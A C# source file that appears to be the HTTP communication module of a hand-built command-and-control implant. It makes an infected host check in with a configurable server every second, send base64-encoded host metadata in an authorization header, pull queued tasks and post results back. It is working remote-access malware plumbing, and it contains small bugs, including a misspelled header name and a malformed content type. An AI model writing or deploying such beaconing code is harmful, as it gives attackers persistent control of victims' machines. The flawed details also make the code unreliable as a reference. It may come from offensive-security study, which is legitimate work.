using System;

using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;

using System.Threading;
using System.Threading.Tasks;

namespace Agent.Models
{
    public class HttpCommModule : CommModule 
    {
        public string ConnectAddress {get; set; }
        public int ConnectPort { get; set; }


        private CancellationTokenSource _tokenSource ;
        private HttpClient _client ;

        public HttpCommModule(string connectAddress , int connectPort )
        {
            ConnectAddress = connectAddress;
            ConnectPort = connectPort;
        
        
        }

        public override void Init(AgentMetadata metadata)
        {
            base.Init(metadata);


            _client = new HttpClient();
            _client.BaseAddress = new Uri($"Http://{ConnectAddress}:{ConnectPort}");
            _client.DefaultRequestHeaders.Clear();

            var encodedMetadata = Convert.ToBase64String( AgentMetadata.Serialise());
            _client.DefaultRequestHeaders.Add("Autorization",$"Bearer{ encodedMetadata}");
        }
        public override async Task Start() { 

            _tokenSource = new CancellationTokenSource();
            while (!_tokenSource.IsCancellationRequested) 
            { 
            //check if we have data to sedn 
            if (!Outbound.IsEmpty)
                {

                    await PostData();
                }
            else
                {

                    await CheckIn();
                }

                await Task.Delay(1000);


            //chekin
            //get tasks
            //sleep
           
            }

        }

        private async Task  CheckIn()
        {
            var response = await _client.GetByteArrayAsync("/");
            HandleResponse(response);

        }

        private async Task PostData()
        {
            var outbound = GetOutbound().Serialise();

            var content = new StringContent(Encoding.UTF8.GetString( outbound ),Encoding.UTF8,"application/json'");
            var response = await  _client.PostAsync("/",content);
            var responseConetent = await response.Content.ReadAsByteArrayAsync();
            HandleResponse(responseConetent);

        }


        private void HandleResponse(byte[] response)
        {
            var tasks = response.Deserialize<AgentTask[]>();
            if (tasks != null && tasks.Any())
            {
                foreach(var task in tasks)
                {

                    Inbound.Enqueue(task);
                }
            
            }

        }

        public override void Stop()
        {
            throw new NotImplementedException();
        }
    }
}
